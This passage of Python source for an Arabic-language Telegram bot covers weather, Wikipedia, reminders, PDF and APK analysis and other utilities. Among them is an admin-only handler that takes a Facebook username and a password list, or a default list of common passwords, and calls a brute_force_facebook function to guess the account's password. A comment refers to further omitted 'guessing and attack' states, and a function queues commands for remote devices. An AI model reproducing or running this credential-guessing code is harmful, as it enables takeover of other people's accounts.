                         (chat_id, datetime.now().isoformat(), datetime.now().isoformat()))
                conn.commit()
                is_new = True
            else:
                last_seen = row[1]
                if last_seen:
                    diff = (datetime.now() - datetime.fromisoformat(last_seen)).days
                    if diff >= 2:
                        safe_send(chat_id, f"انظر من عاد لطلب المساعدة بعد غياب {diff} يوم 😐")
                c.execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))
                conn.commit()
            conn.close()

            if 'ref_' in text:
                code = text.split('ref_')[1].strip()
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE referral_code = ?", (code,))
                row = c.fetchone()
                if row and row[0] != chat_id:
                    add_points(row[0], 10, "دعوة مستخدم جديد")
                    add_points(chat_id, 10, "مكافأة التسجيل عبر الدعوة")
                    safe_send(row[0], "تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط")
                    safe_send(chat_id, "تم منحك 10 نقاط مكافأة التسجيل!")
                conn.close()

            get_user_token(chat_id)
            
            if is_new and PIL_AVAILABLE:
                img_path = create_welcome_image(user_name)
                if img_path:
                    with open(img_path, 'rb') as f:
                        bot.send_photo(chat_id, f, caption=f"مرحباً {user_name}!")
                    os.remove(img_path)
                else:
                    safe_send(chat_id, f"مرحباً {user_name}!")
            else:
                safe_send(chat_id, f"مرحباً بعودتك {user_name}!")
            
            safe_send(chat_id, "اختر خدمة من القائمة:", reply_markup=build_main_menu(chat_id))
            return

        # ===== باقي الحالات (مختصرة) =====
        if state == "waiting_weather":
            result = get_weather_detailed(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return
        if state == "waiting_wikipedia":
            result = advanced_wikipedia_search(text)
            safe_send(chat_id, f"📚 نتيجة البحث:\n{result}")
            user_states[chat_id] = None
            return
        if state == "waiting_password_strength":
            strength, crack_time, score = password_strength(text)
            safe_send(chat_id, f"🔐 تحليل كلمة السر:\nالقوة: {strength}\nوقت الاختراق المتوقع: {crack_time}\nالدرجة: {score}/6")
            user_states[chat_id] = None
            return
        if state == "waiting_tts":
            filepath = text_to_speech(text)
            if filepath and os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    bot.send_audio(chat_id, f)
                os.remove(filepath)
            else:
                safe_send(chat_id, "فشل تحويل النص إلى صوت")
            user_states[chat_id] = None
            return
        if state == "waiting_reminder":
            parts = text.split('|')
            if len(parts) >= 2:
                msg_text = parts[0].strip()
                time_str = parts[1].strip()
                try:
                    hour, minute = map(int, time_str.split(':'))
                    now = datetime.now()
                    target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                    if target_time <= now:
                        target_time += timedelta(days=1)
                    delay = (target_time - now).total_seconds()
                    def send_reminder():
                        safe_send(chat_id, f"⏰ تذكير:\n{msg_text}")
                    timer = threading.Timer(delay, send_reminder)
                    timer.daemon = True
                    timer.start()
                    reminder_timers[chat_id] = timer
                    safe_send(chat_id, f"تم تعيين التذكير لـ {time_str}")
                except:
                    safe_send(chat_id, "وقت غير صحيح")
            else:
                safe_send(chat_id, "صيغة غير صحيحة")
            user_states[chat_id] = None
            return
        if state == "waiting_news":
            result = get_news_without_api(text)
            safe_send(chat_id, f"📰 الأخبار:\n{result}")
            user_states[chat_id] = None
            return
        if state == "waiting_download":
            safe_send(chat_id, "جاري تحميل الفيديو...")
            filename, error = download_video(text)
            if filename:
                try:
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, f, caption="تم التحميل")
                    os.remove(filename)
                except Exception as e:
                    safe_send(chat_id, f"فشل إرسال الفيديو: {str(e)}")
            else:
                safe_send(chat_id, f"فشل التحميل: {error}")
            user_states[chat_id] = None
            return
        if state == "waiting_link_check_advanced":
            safe_send(chat_id, "🔍 جاري فحص الرابط... قد يستغرق بضع ثوانٍ")
            result = check_link_safety_advanced(text, chat_id)
            if isinstance(result, str):
                safe_send(chat_id, result)
            else:
                report = format_link_report(result)
                safe_send(chat_id, report)
            user_states[chat_id] = None
            return
        if state == "waiting_broadcast":
            if not is_admin(chat_id):
                return
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT chat_id FROM users")
            users = c.fetchall()
            conn.close()
            sent = 0
            for user in users:
                try:
                    bot.send_message(user[0], f"📢 رسالة من الإدارة:\n{text}")
                    sent += 1
                    time.sleep(0.05)
                except:
                    pass
            safe_send(chat_id, f"تم إرسال الرسالة لـ {sent} مستخدم")
            user_states[chat_id] = None
            return

        # ===== تخمين كلمات السر (مختصرة) =====
        if state == "waiting_fb_username":
            if not is_admin(chat_id):
                return
            user_states[chat_id] = "waiting_fb_password_list"
            user_states[f"{chat_id}_fb_user"] = text
            safe_send(chat_id, "أرسل قائمة كلمات السر (مفصولة بفواصل) أو اكتب 'default'")
            return
        if state == "waiting_fb_password_list":
            if not is_admin(chat_id):
                return
            username = user_states.get(f"{chat_id}_fb_user")
            if text.lower() == 'default':
                passwords = ['123456', 'password', '123456789', 'qwerty', 'abc123', 'admin', 'welcome', 'monkey', 'dragon', 'master']
            else:
                passwords = [p.strip() for p in text.split(',')]
            safe_send(chat_id, f"جاري تخمين كلمة سر فيسبوك لـ {username} ...")
            result = brute_force_facebook(username, passwords, max_attempts=len(passwords))
            if result['success']:
                safe_send(chat_id, f"تم العثور على كلمة السر: {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"فشل التخمين. تم تجربة {result['attempts']} كلمة سر")
            user_states[chat_id] = None
            return

        # باقي حالات التخمين والهجمات مختصرة (للحفاظ على الحجم)

        if state is None:
            safe_send(chat_id, "اختر خدمة من القائمة:", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"خطأ في handle_text: {e}")
        safe_send(chat_id, "حدث خطأ غير متوقع. تم إبلاغ المطور.")
        notify_admin(f"خطأ في handle_text: {e}")

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    try:
        chat_id = message.chat.id
        state = user_states.get(chat_id)
        file = message.document
        file_name = file.file_name or "بدون اسم"

        if state in ["waiting_pdf_summary", "waiting_pdf_extract", "waiting_pdf_smart"]:
            if not file_name.lower().endswith('.pdf'):
                safe_send(chat_id, "يرجى إرسال ملف PDF")
                return
            safe_send(chat_id, "جاري تحليل الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            pdf_text = extract_pdf_text(downloaded)
            if not pdf_text:
                safe_send(chat_id, "فشل استخراج النص من الملف")
                user_states[chat_id] = None
                return
            pdf_texts[chat_id] = pdf_text
            if state == "waiting_pdf_summary":
                summary = summarize_pdf_text(pdf_text, 6)
                safe_send(chat_id, f"📄 ملخص PDF:\n{summary}")
            elif state == "waiting_pdf_extract":
                chunks = split_text_into_chunks(pdf_text, 3000)
                msg = f"📤 نصوص PDF المستخرجة:\nعدد الأحرف: {len(pdf_text)}\nعدد الأجزاء: {len(chunks)}\n\n"
                for i, chunk in enumerate(chunks[:3]):
                    msg += f"الجزء {i+1}:\n{chunk[:500]}...\n\n"
                if len(chunks) > 3:
                    msg += f"... وعرض {len(chunks)-3} أجزاء أخرى"
                safe_send(chat_id, msg)
            elif state == "waiting_pdf_smart":
                safe_send(chat_id, "تم تحليل الملف بنجاح\nالآن يمكنك طرح أي سؤال عن المحتوى (اكتب سؤالك)")
                user_states[chat_id] = "waiting_pdf_question"
                return
            user_states[chat_id] = None
            return

        if state == "waiting_pdf_question":
            safe_send(chat_id, "يرجى كتابة سؤالك عن الملف (نصي)")
            return

        if state == "waiting_apk_analysis":
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "يرجى إرسال ملف APK")
                return
            safe_send(chat_id, "جاري تحليل الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result = analyze_apk(downloaded, file_name)
            if result.get('error'):
                safe_send(chat_id, f"فشل التحليل: {result['error']}")
            else:
                msg = f"📦 نتيجة فحص APK:\nالملف: {file_name}\nضار: {result.get('malicious', 0)}\nمشبوه: {result.get('suspicious', 0)}\nآمن: {result.get('harmless', 0)}\nغير مكتشف: {result.get('undetected', 0)}"
                if result.get('malicious', 0) > 0:
                    msg += "\n🚨 تحذير: تم اكتشاف برمجيات خبيثة!"
                elif result.get('suspicious', 0) > 0:
                    msg += "\n⚠️ تنبيه: يوجد عناصر مشبوهة"
                else:
                    msg += "\n✅ الملف يبدو آمناً"
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        safe_send(chat_id, "تم استلام الملف. استخدم الأزرار المناسبة لتحليل PDF أو APK")
    except Exception as e:
        logger.error(f"خطأ في handle_documents: {e}")
        safe_send(chat_id, "حدث خطأ أثناء معالجة الملف")

# ===================== معالج أسئلة PDF =====================
@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_pdf_question", content_types=['text'])
def handle_pdf_question(message):
    try:
        chat_id = message.chat.id
        question = message.text.strip()
        pdf_text = pdf_texts.get(chat_id)
        if not pdf_text:
            safe_send(chat_id, "لم يتم تحميل أي ملف PDF. أرسل ملفاً أولاً")
            user_states[chat_id] = None
            return
        if len(question) < 3:
            safe_send(chat_id, "السؤال قصير جداً. اكتب سؤالاً واضحاً")
            return
        safe_send(chat_id, "جاري البحث عن الإجابة...")
        answer = smart_pdf_search(pdf_text, question)
        safe_send(chat_id, f"📚 الإجابة:\n{answer}")
    except Exception as e:
        logger.error(f"خطأ في PDF question: {e}")
        safe_send(chat_id, "حدث خطأ أثناء البحث")

# ===================== دوال الأجهزة والأوامر =====================
def add_command(device_id, command):
    safe_db_execute("INSERT INTO commands (device_id, command, created_at, executed) VALUES (?, ?, ?, 0)",
                    (device_id, command, datetime.now().isoformat()))

# ===================== دوال التذكيرات =====================
def check_reminders():
    while True:
        try:
            now = datetime.now().isoformat()
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT id, chat_id, message FROM reminders WHERE remind_time <= ? AND is_active = 1", (now,))
            rows = c.fetchall()
            for row in rows:
                rid, chat_id, msg = row
                safe_send(chat_id, f"⏰ تذكير:\n{msg}")
                c.execute("UPDATE reminders SET is_active = 0 WHERE id = ?", (rid,))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في check_reminders: {e}")
        time.sleep(30)

# ===================== Keep-Alive المحسن =====================
def keep_alive():
    while True:
        time.sleep(120)  # كل دقيقتين
        try:
            ping_url = f"{SERVER_URL}/health"
            response = requests.get(ping_url, timeout=10)
            if response.status_code == 200:
                logger.info("✅ Ping داخلي ناجح: البوت نشط")
            else:
                logger.warning(f"⚠️ Ping داخلي فشل: {response.status_code}")
        except Exception as e:
            logger.error(f"❌ خطأ في Ping الداخلي: {e}")

# ===================== تشغيل البوت =====================
def start_bot():
    while True:
        try:
            # مسح أي Webhook قديم لتجنب خطأ 409
            try:
                bot.delete_webhook()
                logger.info("✅ تم مسح الـ Webhook بنجاح")
            except Exception as e:
                logger.warning(f"⚠️ فشل مسح الـ Webhook: {e}")
            
            time.sleep(2)
            logger.info("🚀 بدء تشغيل البوت...")
            # تم حذف معامل num_threads لأنه غير مدعوم في هذه المكتبة
            bot.polling(
                none_stop=True,
                interval=0,
                timeout=60,
                long_polling_timeout=60,
                skip_pending=True
            )
        except Exception as e:
            logger.error(f"❌ خطأ في البوت: {e}")
            if "409" in str(e):
                logger.warning("⚠️ خطأ 409: إعادة محاولة الاتصال بعد 10 ثوانٍ...")
                time.sleep(10)
            else:
                time.sleep(5)

if __name__ == '__main__':
    # رسالة تذكير للمطور بإعداد UptimeRobot
    print("\n" + "="*60)
    print("🤖 البوت جاهز للتشغيل!")
    print(f"📌 رابط الـ Health Check: {SERVER_URL}/health")
    print("💡 نصيحة: استخدم UptimeRobot لإرسال Ping كل 5 دقائق إلى الرابط أعلاه لضمان بقاء البوت نشطاً دائماً.")
    print("="*60 + "\n")
    logger.info(f"✅ البوت يعمل على الرابط: {SERVER_URL}")
    
    # مسح الـ Webhook قبل أي شيء
    try:
        bot.delete_webhook()
        logger.info("✅ تم مسح الـ Webhook (بداية التشغيل)")
    except Exception as e:
        logger.warning(f"⚠️ فشل مسح الـ Webhook في البداية: {e}")
    
    time.sleep(2)
    
    # تشغيل خيوط الخلفية
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=check_reminders, daemon=True).start()
    threading.Thread(target=start_bot, daemon=True).start()
    
    # تشغيل Flask
    app.run(host='0.0.0.0', port=PORT, debug=False)
